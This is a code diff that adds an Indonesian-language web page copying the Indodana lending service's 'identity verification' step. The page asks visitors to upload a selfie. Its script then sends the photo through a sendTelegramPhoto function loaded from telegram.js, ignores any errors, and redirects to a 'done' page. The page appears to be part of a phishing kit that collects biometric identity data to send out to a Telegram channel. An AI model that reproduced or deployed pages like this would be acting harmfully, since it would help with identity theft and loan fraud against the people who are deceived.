@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Upload Selfie – Indodana</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background: #fff;
+      width: 100%;
+      max-width: 390px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .topbar {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 16px 20px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .back-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #333;
+      padding: 4px;
+      display: flex;
+      align-items: center;
+    }
+
+    .topbar-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #222;
+    }
+
+    .progress-wrap {
+      padding: 16px 20px 0;
+    }
+
+    .progress-label {
+      font-size: 12px;
+      color: #999;
+      margin-bottom: 8px;
+    }
+
+    .progress-bar {
+      height: 4px;
+      background: #f0f0f0;
+      border-radius: 99px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 66%;
+      background: #FF6600;
+      border-radius: 99px;
+    }
+
+    .body {
+      padding: 24px 20px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .section-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #222;
+    }
+
+    .section-desc {
+      font-size: 13px;
+      color: #777;
+      line-height: 1.6;
+      margin-top: 4px;
+    }
+
+    /* Selfie frame illustration */
+    .selfie-frame {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 8px 0;
+    }
+
+    .face-oval {
+      width: 140px;
+      height: 170px;
+      border: 3px dashed #FF6600;
+      border-radius: 50%;
+      background: #fff8f4;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+    }
+
+    .face-oval svg {
+      color: #ffb380;
+    }
+
+    /* Upload card */
+    .upload-card {
+      border: 2px dashed #e0e0e0;
+      border-radius: 14px;
+      padding: 28px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+      cursor: pointer;
+      transition: border-color 0.2s, background 0.2s;
+      position: relative;
+      background: #fafafa;
+    }
+
+    .upload-card:hover, .upload-card.drag-over {
+      border-color: #FF6600;
+      background: #fff8f4;
+    }
+
+    .upload-card input[type="file"] {
+      position: absolute;
+      inset: 0;
+      opacity: 0;
+      cursor: pointer;
+      width: 100%;
+      height: 100%;
+    }
+
+    .upload-icon {
+      width: 56px;
+      height: 56px;
+      background: #fff3ec;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .upload-icon svg { color: #FF6600; }
+
+    .upload-label {
+      text-align: center;
+    }
+
+    .upload-label strong {
+      display: block;
+      font-size: 14px;
+      font-weight: 700;
+      color: #333;
+    }
+
+    .upload-label span {
+      font-size: 12px;
+      color: #aaa;
+    }
+
+    /* Preview */
+    .preview-wrap {
+      display: none;
+      position: relative;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
+    .preview-wrap img {
+      width: 100%;
+      border-radius: 10px;
+      display: block;
+      object-fit: cover;
+      max-height: 220px;
+    }
+
+    .preview-remove {
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      background: rgba(0,0,0,0.55);
+      border: none;
+      border-radius: 50%;
+      width: 28px;
+      height: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: #fff;
+    }
+
+    /* Tips */
+    .tips {
+      background: #fff8f4;
+      border-radius: 12px;
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .tips-title {
+      font-size: 13px;
+      font-weight: 700;
+      color: #FF6600;
+    }
+
+    .tip-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      font-size: 12px;
+      color: #666;
+      line-height: 1.5;
+    }
+
+    .tip-dot {
+      width: 6px;
+      height: 6px;
+      background: #FF6600;
+      border-radius: 50%;
+      margin-top: 5px;
+      flex-shrink: 0;
+    }
+
+    .footer {
+      padding: 16px 20px 28px;
+    }
+
+    .btn-lanjut {
+      width: 100%;
+      background: #FF6600;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      padding: 15px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+    }
+
+    .btn-lanjut:disabled {
+      background: #ffb380;
+      cursor: not-allowed;
+    }
+
+    .btn-lanjut:not(:disabled):hover { background: #e05a00; }
+    .btn-lanjut:not(:disabled):active { transform: scale(0.98); }
+
+    .err-msg {
+      font-size: 12px;
+      color: #e53935;
+      margin-top: 8px;
+      text-align: center;
+      display: none;
+    }
+
+    .err-msg.show { display: block; }
+  </style>
+</head>
+<body>
+  <div class="container">
+
+    <div class="topbar">
+      <button class="back-btn" onclick="history.back()">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+          <path d="M19 12H5M12 5l-7 7 7 7"/>
+        </svg>
+      </button>
+      <span class="topbar-title">Verifikasi Identitas</span>
+    </div>
+
+    <div class="progress-wrap">
+      <div class="progress-label">Langkah 2 dari 3</div>
+      <div class="progress-bar"><div class="progress-fill"></div></div>
+    </div>
+
+    <div class="body">
+
+      <div>
+        <div class="section-title">Foto Selfie</div>
+        <div class="section-desc">Ambil foto wajahmu. Pastikan wajah terlihat jelas dan pencahayaan cukup.</div>
+      </div>
+
+      <div class="selfie-frame">
+        <div class="face-oval">
+          <svg width="72" height="72" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/>
+          </svg>
+        </div>
+      </div>
+
+      <div class="upload-card" id="uploadCard">
+        <input type="file" id="selfieFile" accept="image/*" capture="user" />
+        <div class="upload-icon">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/>
+            <circle cx="12" cy="13" r="4"/>
+          </svg>
+        </div>
+        <div class="upload-label">
+          <strong>Ambil / Pilih Selfie</strong>
+          <span>JPG, PNG – maks. 5 MB</span>
+        </div>
+      </div>
+
+      <div class="preview-wrap" id="previewWrap">
+        <img id="previewImg" src="" alt="Preview Selfie" />
+        <button class="preview-remove" id="removeBtn" type="button">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+            <line x1="18" y1="6" x2="6" y2="18"/>
+            <line x1="6" y1="6" x2="18" y2="18"/>
+          </svg>
+        </button>
+      </div>
+
+      <div class="tips">
+        <div class="tips-title">Tips foto selfie yang baik:</div>
+        <div class="tip-item"><span class="tip-dot"></span>Wajah menghadap kamera secara langsung</div>
+        <div class="tip-item"><span class="tip-dot"></span>Tidak menggunakan kacamata atau topi</div>
+        <div class="tip-item"><span class="tip-dot"></span>Ekspresi netral, mulut tertutup</div>
+        <div class="tip-item"><span class="tip-dot"></span>Pencahayaan cukup, tidak terlalu gelap atau terlalu terang</div>
+      </div>
+
+    </div>
+
+    <div class="footer">
+      <button class="btn-lanjut" id="btnLanjut" disabled>Lanjut</button>
+      <div class="err-msg" id="errMsg">Silakan upload foto selfie terlebih dahulu</div>
+    </div>
+
+  </div>
+
+  <script src="telegram.js"></script>
+  <script>
+    const fileInput = document.getElementById('selfieFile');
+    const uploadCard = document.getElementById('uploadCard');
+    const previewWrap = document.getElementById('previewWrap');
+    const previewImg = document.getElementById('previewImg');
+    const removeBtn = document.getElementById('removeBtn');
+    const btnLanjut = document.getElementById('btnLanjut');
+    const errMsg = document.getElementById('errMsg');
+
+    let hasFile = false;
+
+    fileInput.addEventListener('change', () => {
+      const file = fileInput.files[0];
+      if (!file) return;
+
+      if (file.size > 5 * 1024 * 1024) {
+        errMsg.textContent = 'Ukuran file terlalu besar (maks. 5 MB)';
+        errMsg.classList.add('show');
+        return;
+      }
+
+      errMsg.classList.remove('show');
+      const url = URL.createObjectURL(file);
+      previewImg.src = url;
+      previewWrap.style.display = 'block';
+      uploadCard.style.display = 'none';
+      btnLanjut.disabled = false;
+      hasFile = true;
+    });
+
+    removeBtn.addEventListener('click', () => {
+      fileInput.value = '';
+      previewImg.src = '';
+      previewWrap.style.display = 'none';
+      uploadCard.style.display = 'flex';
+      btnLanjut.disabled = true;
+      hasFile = false;
+    });
+
+    uploadCard.addEventListener('dragover', (e) => {
+      e.preventDefault();
+      uploadCard.classList.add('drag-over');
+    });
+
+    uploadCard.addEventListener('dragleave', () => {
+      uploadCard.classList.remove('drag-over');
+    });
+
+    uploadCard.addEventListener('drop', (e) => {
+      e.preventDefault();
+      uploadCard.classList.remove('drag-over');
+      const file = e.dataTransfer?.files[0];
+      if (file && file.type.startsWith('image/')) {
+        const dt = new DataTransfer();
+        dt.items.add(file);
+        fileInput.files = dt.files;
+        fileInput.dispatchEvent(new Event('change'));
+      }
+    });
+
+    btnLanjut.addEventListener('click', async () => {
+      if (!hasFile) {
+        errMsg.textContent = 'Silakan upload foto selfie terlebih dahulu';
+        errMsg.classList.add('show');
+        return;
+      }
+      btnLanjut.disabled = true;
+      btnLanjut.textContent = 'Mengirim...';
+      try {
+        await sendTelegramPhoto(fileInput.files[0], '🤳 Foto Selfie Indodana');
+      } catch (_) {}
+      window.location.href = 'selesai.html';
+    });
+  </script>
+</body>
+</html>
